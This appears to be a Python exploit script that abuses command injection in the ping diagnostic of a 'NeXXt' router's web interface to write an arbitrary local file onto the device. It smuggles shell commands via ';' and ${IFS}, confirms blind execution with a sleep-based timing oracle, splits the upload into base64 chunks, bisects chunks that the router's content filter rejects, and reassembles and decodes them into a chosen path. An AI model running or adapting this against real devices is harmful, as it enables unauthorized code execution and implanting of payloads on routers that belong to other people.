#!/usr/bin/env python3
"""Reliable file transfer to the NeXXt via ping injection.

The backend occasionally rejects specific host strings (content-triggered),
so segments that repeatedly fail verification are recursively bisected into
smaller segments. Every segment lands in its own idempotent file
(/tmp/nxseg_<tag>_<nnn>) and is grep-verified via a timing oracle.
Use assemble() on the router to concatenate + undelimit + decode.
"""

from __future__ import annotations

import base64
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from nexxt_session import NexxtClient  # noqa: E402
from nexxt_phaseb import run_ping  # noqa: E402

I = "${IFS}"
CHUNK = 48
MAX_TRIES = 4
ORACLE_SLEEP = 5  # seconds added by the timing oracle when a condition holds


class Injector:
    def __init__(self, base_url: str = "https://192.168.1.254") -> None:
        self.client = NexxtClient(base_url, timeout=10.0)
        if not self.client.is_authenticated():
            raise RuntimeError("not authenticated; run nexxt_session.py login "
                               "or import-cookie first")
        self.base, _ = run_ping(self.client, "127.0.0.1")
        self.counter = 0

    def do(self, cmd: str) -> float:
        elapsed, _ = run_ping(self.client, ":::::::;" + cmd)
        return elapsed

    def ask(self, cmd: str) -> bool:
        elapsed, _ = run_ping(
            self.client, ":::::::;" + cmd + f"&&sleep{I}{ORACLE_SLEEP}")
        return elapsed > self.base + ORACLE_SLEEP - 2

    def _write_segment(self, seg: str, part: str, depth: int = 0) -> list[str]:
        # grep -qFx matches the WHOLE line: since the file has no trailing
        # newline, an exact full-line match proves both content and length in
        # a single oracle round-trip (about 2x faster than content+length).
        for attempt in range(MAX_TRIES):
            self.do(f"printf{I}%s{I}{seg}|tee{I}{part}")
            time.sleep(0.4)
            if self.ask(f"grep{I}-qFx{I}{seg}{I}{part}"):
                print(f"[transfer] {part} ok ({len(seg)} chars)", flush=True)
                return [part]
            print(f"[transfer] {part} attempt {attempt + 1} failed", flush=True)
        if depth >= 6 or len(seg) <= 2:
            raise RuntimeError(f"segment too stubborn: {seg!r}")
        mid = len(seg) // 2
        print(f"[transfer] bisecting segment of {len(seg)} chars", flush=True)
        left = self._write_segment(seg[:mid], part + "a", depth + 1)
        right = self._write_segment(seg[mid:], part + "b", depth + 1)
        return left + right

    def push(self, data: bytes, tag: str) -> list[str]:
        """Returns ordered list of remote part files (b64url encoded)."""
        b64 = base64.b64encode(data).decode().replace("+", "-").replace("/", "_")
        self.do(f"rm{I}-f{I}/tmp/nxseg_{tag}_*")
        parts: list[str] = []
        chunks = [b64[i:i + CHUNK] for i in range(0, len(b64), CHUNK)]
        for n, chunk in enumerate(chunks):
            self.counter += 1
            parts += self._write_segment(chunk, f"/tmp/nxseg_{tag}_{n:03d}")
        return parts

    def assemble(self, parts: list[str], target: str) -> bool:
        """cat parts | tr -_ +/ | base64 -d | tee target; verify by size>0."""
        listing = " ".join(parts)
        self.do(f"cat{I}{listing}|tr{I}'-_'{I}'+/'|base64{I}-d|tee{I}{target}")
        time.sleep(0.5)
        return self.ask(f"test{I}-s{I}{target}")


def main() -> int:
    if len(sys.argv) < 4:
        print("usage: nexxt_transfer.py <local_file> <tag> <remote_target>")
        return 2
    data = open(sys.argv[1], "rb").read()
    inj = Injector()
    print(f"[transfer] baseline {inj.base:.1f}s, payload {len(data)} bytes", flush=True)
    parts = inj.push(data, sys.argv[2])
    ok = inj.assemble(parts, sys.argv[3])
    print(f"[transfer] assembled {sys.argv[3]}: {'OK' if ok else 'FAIL'}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
